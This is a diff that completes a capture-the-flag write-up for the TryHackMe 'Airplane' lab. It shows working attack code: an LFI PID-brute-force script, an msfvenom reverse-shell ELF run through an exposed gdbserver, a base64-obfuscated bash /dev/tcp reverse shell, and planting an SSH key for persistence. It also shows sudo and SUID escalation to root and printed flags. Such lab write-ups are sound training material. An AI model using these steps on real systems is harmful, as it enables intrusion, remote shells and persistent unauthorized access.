@@ -1,12 +1,13 @@
 ---
 layout: default
 title: Airplane
-status: incomplete
 ---
 
 ## TL;DR
 
+In this challenge we exploit `LFI` to find the process running on port `6048`. We exploit the `gdbserver` running on port `6048` to get `RCE`, and then get shell as `hudson`.
 
+From there we move to user `carlos` using SUID bin on `find`, and then move to root using sudo on `ruby` with `*`, which let us execute arbitrary ruby scripts as root.
 
 ### Recon
 
@@ -39,7 +40,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 I added `airplane.thm` to my `/etc/hosts`
 
-### ...
+### Detect LFI in page GET parameter
 
 when we visit the root page on port `8000` we are being redirected to `http://airplane.thm:8000/?page=index.html`.
 
@@ -131,6 +132,180 @@ SHELL=/bin/bash
 INVOCATION_ID=836e8c7c08ed4afabf87ca76a513355c
 JOURNAL_STREAM=9:19063
 ```
-### Privilege Escalation to Root
 
+### Find gdbserver is running on port 6048 and get RCE
 
+We now there is some service on port `6048`, which is unique. So, I this script [https://github.com/josemlwdf/LFI_PID_Fuzzer](https://github.com/josemlwdf/LFI_PID_Fuzzer) to brute force PID's using the `LFI`, maybe we'll find something interesting.
+
+This is the script after modification:
+```py
+import requests
+import threading
+
+thread_list = []
+
+def call(PID):
+    url = "http://airplane.thm:8000/?page=../../../../../../../"    
+    payload = "/proc/{}/cmdline".format(PID)
+    resp = requests.get(url + payload).text
+    if (not "not found" in resp) and (resp.strip() != ""):
+        print(resp)
+
+for i in range (1, 5000):
+    thread = threading.Thread(target=call, args=(i,))
+    thread.start()
+    thread_list.append(thread)
+
+for thread in thread_list:
+    thread.join()
+```
+
+We can find this interesting line:
+```bash
+/usr/bin/gdbserver 0.0.0.0:6048 airplane                                                                                                           
+```
+
+![LFI brute](image-4.png)
+
+I googled for `gdbserver` exploit, and find this [https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-remote-gdbserver](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-remote-gdbserver).
+
+```bash
+┌──(agonen㉿kali)-[~/thm/Airplane]                                                                                                                                                           
+└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.164.248 LPORT=1337 PrependFork=true -f elf -o binary.elf                                                                           
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload                                                                                                         
+[-] No arch selected, selecting arch: x64 from the payload                                                                                                                                   
+No encoder specified, outputting raw payload                                                                                                                                                 
+Payload size: 106 bytes                                                                                                                                                                      
+Final size of elf file: 226 bytes                                                                                                                                                            
+Saved as: binary.elf                                                                                                                                                                         
+                                                                                                                                                                                             
+┌──(agonen㉿kali)-[~/thm/Airplane]                                                                                                                                                           
+└─$ chmod +x binary.elf
+```
+
+and inside the `gdb`:
+```bash
+┌──(agonen㉿kali)-[~/thm/Airplane]
+└─$ gdb binary.elf
+
+GNU gdb (Debian 16.3-5) 16.3
+Copyright (C) 2024 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from binary.elf...
+(No debugging symbols found in binary.elf)
+(gdb) target extended-remote 10.67.131.158:6048
+Remote debugging using 10.67.131.158:6048
+(gdb) remote put binary.elf /tmp/binary.elf
+Successfully sent file "binary.elf".
+(gdb) set remote exec-file /tmp/binary.elf
+(gdb) run
+Starting program: /home/agonen/thm/Airplane/binary.elf 
+[Detaching after fork from child process 81366]
+[Inferior 1 (process 81344) exited normally]
+```
+
+Notice, we upload the file after connecting to the remote gdb, and then execute it.
+
+In another window, i set up a listener:
+```bash
+nc -nvlp 1337
+```
+
+![reverse shell](image-5.png)
+
+And of course, paste the payload from penelope:
+```bash
+printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC4xNjQuMjQ4LzQ0NDQgMD4mMSkgJg==|base64 -d|bash
+```
+
+![reverse shell](image-6.png)
+
+### Move to user carlos using SUID on find
+
+I executed linpeas and found we have sudo on `/usr/bin/find`, which is controlled by `carlos`
+
+![sudo on find](image-7.png)
+
+I used [https://gtfobins.github.io/gtfobins/find/](https://gtfobins.github.io/gtfobins/find/), this is the command we'll use
+```bash
+/usr/bin/find . -exec /bin/bash -p \; -quit
+```
+
+![user flag](image-8.png)
+
+we grab the user flag:
+```bash
+hudson@airplane:/tmp$ /usr/bin/find . -exec /bin/bash -p \; -quit
+bash-5.0$ cd /home/carlos
+bash-5.0$ cat user.txt 
+eebfca2ca5a2b8a56c46c781aeea7562
+```
+
+For persisteny, I created pair of keys:
+```bash
+┌──(agonen㉿kali)-[~/thm/Airplane]                                                                                                               
+└─$ ssh-keygen -t rsa -b 2048 -f ./key -q -N ""
+```
+
+Then, i put the content of `key.pub` inside `/home/carlos/.ssh/authorized_keys`:
+```bash
+bash-5.0$ echo -e 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+3+fl6f+TYGSnNo/30y4rWG4HBvq55/6bWeHe5ztBIG6krd1hozrOdS1cNsW7qdSI0BJDWkbhpeEvMLhSOiJwvnejCPjAkoeUXZZQh0gQUuSOl7oHkrrQHwUPXiegWfMZgDNbCWver1MeJ8AIn6iYZOvK7iu70vJLezcZXDoUDDc2wOyORM/SVPVq3QfsJAQ1qepuLX8yQmQy5IdvW2loyl97CK1uG/v4JZY/C1uYjVs80Jpv6NRuxU79Q8Y0B0Pi2iAbHWjxx6QyplR2iZX4c/znJR/CdbUpYhwkaxovZkeJQy521hD2QvG4bJEcq6r8ethp1zrG7vJY4ATkD8+l agonen@kali' > /home/carlos/.ssh/authorized_keys
+```
+
+Now we can login via ssh:
+
+![ssh](image-9.png)
+
+### Privilege Escalation to Root using sudo on ruby and *
+
+Using `sudo -l` we can see that we have one command we can execute as root:
+```bash
+carlos@airplane:~$ sudo -l
+Matching Defaults entries for carlos on airplane:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User carlos may run the following commands on airplane:
+    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
+```
+
+Okay, we can exploit the `*` to move it to controlled path:
+```bash
+carlos@airplane:/tmp$ echo -e 'system("id")' > cmd.rb 
+carlos@airplane:/tmp$ sudo /usr/bin/ruby /root/../tmp/cmd.rb 
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+![id](image-10.png)
+
+And now, let's add the `SUID` bit to `/bin/bash`:
+```bash
+carlos@airplane:/tmp$ echo -e 'system("chmod u+s /bin/bash")' > cmd.rb 
+carlos@airplane:/tmp$ sudo /usr/bin/ruby /root/../tmp/cmd.rb 
+carlos@airplane:/tmp$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1183448 Nis 18  2022 /bin/bash
+carlos@airplane:/tmp$ bash -p
+bash-5.0# id
+uid=1000(carlos) gid=1000(carlos) euid=0(root) groups=1000(carlos),27(sudo)
+bash-5.0# cat /root/root.txt 
+190dcbeb688ce5fe029f26a1e5fce002
+```
+
+![root flag](image-11.png)
+
+and the root flag is:
+```bash
+bash-5.0# cat /root/root.txt 
+190dcbeb688ce5fe029f26a1e5fce002
+```
